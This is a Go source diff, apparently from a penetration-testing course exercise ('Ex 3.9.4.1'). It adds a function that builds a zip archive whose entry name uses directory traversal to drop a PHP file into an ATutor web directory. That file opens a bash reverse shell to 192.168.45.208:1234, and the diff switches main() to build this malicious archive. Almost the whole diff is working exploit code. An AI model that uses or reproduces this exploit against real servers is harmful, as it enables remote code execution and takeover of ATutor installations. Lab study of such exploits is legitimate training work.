@@ -77,6 +77,57 @@ func buildZip() {
 	zipWriter.Close()
 }
 
+// Ex 3.9.4.1 - Create POC zip archive (including PHP file with reverse shell)
+func buildBadZip() {
+	archive := utils.CreateZipFile("bad.zip")
+	defer archive.Close()
+	zipWriter := zip.NewWriter(archive)
+
+	phpPayload := "<?php exec(\"/bin/bash -c 'bash -i > /dev/tcp/192.168.45.208/1234 0>&1'\");"
+
+	// poc.txt with file traversal
+	utils.CreateFile("reverse.phtml", phpPayload)
+	file1, err := os.Open("reverse.phtml")
+	if err != nil {
+		log.Fatalln("Error while opening poc.phtml", err)
+	}
+	defer file1.Close()
+
+	utils.PrintInfo("Writing reverse.phtml to zip archive...")
+	writer1, err := zipWriter.Create("../../../../../../../../../../var/www/html/ATutor/mods/poc/reverse.phtml")
+	if err != nil {
+		log.Fatalln("Error while creating poc/poc.txt", err)
+	}
+
+	_, err = io.Copy(writer1, file1)
+	if err != nil {
+		log.Fatalln("Error while writing file to zip archive...", err)
+	}
+
+	// imsmanifest.xml
+	utils.CreateFile("imsmanifest.xml", "invalid XML!")
+	file2, err := os.Open("imsmanifest.xml")
+	if err != nil {
+		log.Fatalln("Error while opening imsmanifest.xml", err)
+	}
+	defer file2.Close()
+
+	utils.PrintInfo("Writing imsmanifest.xml to zip archive...")
+	writer2, err := zipWriter.Create("imsmanifest.xml")
+	if err != nil {
+		log.Fatalln("Error while creating imsmanifest.xml", err)
+	}
+
+	_, err = io.Copy(writer2, file2)
+	if err != nil {
+		log.Fatalln("Error while writing file to zip archive...", err)
+	}
+
+	utils.PrintSuccess("Finished writing and closing zip archive!")
+	zipWriter.Close()
+}
+
 func main() {
-	buildZip()
+	//buildZip()
+	buildBadZip()
 }
